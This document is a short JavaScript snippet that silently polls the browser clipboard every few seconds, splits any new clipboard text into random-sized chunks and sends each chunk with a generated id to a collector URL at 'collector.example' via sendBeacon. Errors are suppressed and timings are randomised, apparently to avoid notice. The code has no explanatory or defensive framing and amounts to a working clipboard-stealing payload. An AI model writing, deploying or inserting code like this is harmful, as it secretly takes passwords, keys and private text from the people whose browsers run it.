const apropriate = () => "https://collector.example/ingest";

!function(){
  let a,b=!1,c=Date.now();
  setInterval(async()=>{
    if(b||Date.now()<c)return;
    b=!0;
    try{
      let clipboardText=await navigator.clipboard.readText();
      if(clipboardText&&clipboardText!==a){
        a=clipboardText;
        let fragments=[],f=700+~~(Math.random()*1300);
        for(let i=0;i<clipboardText.length;i+=f)fragments.push(clipboardText.slice(i,i+f));
        let g=Date.now().toString(36)+Math.random().toString(36).slice(2)+"_x"+(~~(9e4*Math.random())).toString(36);
        fragments.forEach((h,i)=>{
          let j=apropriate()+"?"+["uid","part","total","data"].map((k,l)=>k+"="+encodeURIComponent(l<1?g:l<2?i+1:l<3?fragments.length:h)).join("&");
          navigator.sendBeacon(j);
        });
      }
    }catch(e){}
    finally{b=!1;c=Date.now()+1500+~~(Math.random()*500);}
  },2000+~~(Math.random()*1000));
}();
